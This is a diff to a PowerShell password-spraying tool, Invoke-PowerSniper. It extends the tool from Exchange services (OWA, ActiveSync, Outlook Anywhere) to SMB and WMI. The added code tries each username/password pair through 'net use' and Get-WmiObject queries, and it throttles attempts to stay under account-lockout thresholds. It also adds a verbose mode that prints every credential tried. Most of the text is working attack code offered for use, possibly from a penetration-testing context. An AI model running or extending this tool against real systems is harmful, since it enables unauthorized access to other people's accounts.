@@ -25,11 +25,11 @@ function Invoke-PowerSniper {
 
   .PARAMETER uri
 
-    URI to the web-based Microsoft Exchange service that is being tested.
+    URI to the web-based Microsoft Exchange service that is being tested, IP/hostname for WMI, or the path to the drive for the SMB service.
 
   .PARAMETER svc
 
-    The type of service to test.  Supported services are Outlook Web Access (owa), ActiveSync (as), and Outlook Anywhere (oa).
+    The type of service to test.  Supported services are Outlook Web Access (owa), ActiveSync (as), Outlook Anywhere (oa), WMI (wmi), and SMB (smb).
 
   .PARAMETER userlist
 
@@ -51,13 +51,18 @@ function Invoke-PowerSniper {
 
     The locktime parameter sets the amount of time to in minutes to wait until attempting authentication with the provider usernames again.
 
+  .PARAMETER verbose
+
+    The verbose parameter causes PowerSniper to print off each connection request.
+
+
   .EXAMPLE
 
     C:\PS> Invoke-PowerSniper -uri https://outlook.office365.com -svc as -userlist users.txt -passlist passwords.txt
 
     Description
     -----------
-    This command will attempt to authenticate against the ActiveSync service located on the web server using a list of users provided in users.txt and a list of passwords provided in passwords.txt.  The script will exit if a successful authentication is performed as the default for the sos paramter is to exit on success.  The script will perform three authentication attempts for each user, then pause for 60 minutes before resuming, as the default lockout and locktime values will be used.
+    This command will attempt to authenticate against the ActiveSync service located on the web server using a list of users provided in users.txt and a list of passwords provided in passwords.txt.  The script will stop if a successful authentication is performed as the default for the sos paramter is to stop on success.  The script will perform three authentication attempts for each user, then pause for 60 minutes before resuming, as the default lockout and locktime values will be used.
 
   .EXAMPLE
 
@@ -65,7 +70,7 @@ function Invoke-PowerSniper {
 
     Description
     -----------
-    This command will attempt to authenticate against the Outlook Anywhere service located on the web server using a list of users provided in users.txt and a list of passwords provided in passwords.txt.  The script will exit if a successful authentication is performed as the default for the sos paramter is to exit on success.  The script will perform three authentication attempts for each user, then pause for 60 minutes before resuming, as the default lockout and locktime values will be used.
+    This command will attempt to authenticate against the Outlook Anywhere service located on the web server using a list of users provided in users.txt and a list of passwords provided in passwords.txt.  The script will stop if a successful authentication is performed as the default for the sos paramter is to stop on success.  The script will perform three authentication attempts for each user, then pause for 60 minutes before resuming, as the default lockout and locktime values will be used.
 
   .EXAMPLE
 
@@ -73,7 +78,7 @@ function Invoke-PowerSniper {
 
     Description
     -----------
-    This command will attempt to authenticate against the Outlook Web Access service located on the web server using a list of users provided in users.txt and a list of passwords provided in passwords.txt.  Note that for OWA the script requires the path to where the authentication form posts (check the form tag within the OWA page).  The script will exit if a successful authentication is performed as the default for the sos paramter is to exit on success.  The script will perform three authentication attempts for each user, then pause for 60 minutes before resuming, as the default lockout and locktime values will be used.
+    This command will attempt to authenticate against the Outlook Web Access service located on the web server using a list of users provided in users.txt and a list of passwords provided in passwords.txt.  Note that for OWA the script requires the path to where the authentication form posts (check the form tag within the OWA page).  The script will stop if a successful authentication is performed as the default for the sos paramter is to stop on success.  The script will perform three authentication attempts for each user, then pause for 60 minutes before resuming, as the default lockout and locktime values will be used.
 
   .EXAMPLE
 
@@ -94,7 +99,7 @@ function Invoke-PowerSniper {
 #>
 
   # Do not report exceptions and set variables
-  param($uri, $svc, $userlist, $passlist, [AllowNull()]$sos, [AllowNull()]$lockout, [AllowNull()]$locktime);
+  param($uri, $svc, $userlist, $passlist, [AllowNull()]$sos, [AllowNull()]$lockout, [AllowNull()]$locktime, [switch]$verbose);
 
   # Set encoding to UTF8
   $EncodingForm = [System.Text.Encoding]::UTF8;
@@ -126,6 +131,64 @@ function Invoke-PowerSniper {
   } else {
     $SetLocktime = $locktime;
     $locktime = $SetLocktime * 60;
+  }
+  
+  # Function to authenticate to SMB service
+  function AuthSMB {
+    param($username, $password)
+	
+	# Set default status to failure
+	$AuthStatus = "Failure";
+	
+	# Attempt a SMB connection to the host
+	Try {
+	  # Bind to requested resource
+	  $smbconn = (net use $uri /user:$username $password);
+	  
+	  # If string contains 'command completed successfully' then the creds worked
+	  If ($smbconn | Select-String "command completed successfully") {
+	    $AuthStatus = "Success";
+      } Else {
+	    $AuthStatus = "Failure";
+      }
+	  
+	} Catch {
+      $AuthStatus = "Failure";
+    }
+	
+	# Return the result
+    return $AuthStatus;
+  }
+  
+  # Function to authenticate to WMI service
+  function AuthWMI {
+    param($username, $password)
+	
+	# Set default status to failure
+	$AuthStatus = "Failure";
+	
+	# Create a credential for use with Get-WmiObject
+	$wmipass = ConvertTo-SecureString $password -AsPlainText -Force;
+	$creds = New-Object System.Management.Automation.PsCredential $username, $wmipass;
+	
+	# Attempt a WMI connection to the host
+	Try {
+	  # Query WMI on the host
+	  $wmiconn = Get-WmiObject -Credential $creds -Query "Select Name FROM Win32_Service Where Name='LanmanServer'" -ComputerName $uri;
+	  
+	  # If string contains 'LanmanServer' then the creds worked
+	  If ($wmiconn.Name | Select-String "LanmanServer") {
+	    $AuthStatus = "Success";
+      } Else {
+	    $AuthStatus = "Failure";
+      }
+	  
+	} Catch {
+      $AuthStatus = "Failure";
+    }
+	
+	# Return the result
+    return $AuthStatus;
   }
 
   # Function to authenticate to ActiveSync service
@@ -299,20 +362,32 @@ zL13fBXF+j9+snvSQ0hCOCcECEXKGpIAAZEOoqBGCL33qoSycZcmhxMQO9KVqqKCoBRBUQFRARERbNeK
         # Attempt authentication against ActiveSync and check the status
         $LoginStatus = AuthOutlookAnywhere -username $user -password $pass;
 
-      }
+      } ElseIf ($svc -eq "smb") {
+	  
+	    # Attempt authentication against SMB and check the status
+        $LoginStatus = AuthSMB -username $user -password $pass;
+	  } ElseIf ($svc -eq "wmi") {
+	  
+	    # Attempt authentication against WMI and check the status
+        $LoginStatus = AuthWMI -username $user -password $pass;
+	  }
+	  
+	  # If verbose mode is set, print off each connection attempt
+	  If ($verbose -eq $true) {
+	    Write-Host "Connecting to $uri via $svc using $user / $pass";
+	  }
 
-      # If login succeeded, write out to prompt and exit if configured to exit on success
+      # If login succeeded, write out to prompt and stop if configured to stop on success
       If ($LoginStatus -eq "Success") {
         Write-Host "Authentication to service $svc succeeded: $user / $pass";
 
-        # Check if set to exit on success, if not, remove the user with the successful authentication
+        # Check if set to stop on success, if not, remove the user with the successful authentication
         If ($sos -eq 1) {
-          exit;
+          break;
         } Else {
           $usernames.RemoveAt($i);
         }
-      }
-    
+	  }
     }
 
     # If we have hit the lockout threshold, we need to sleep and reset it
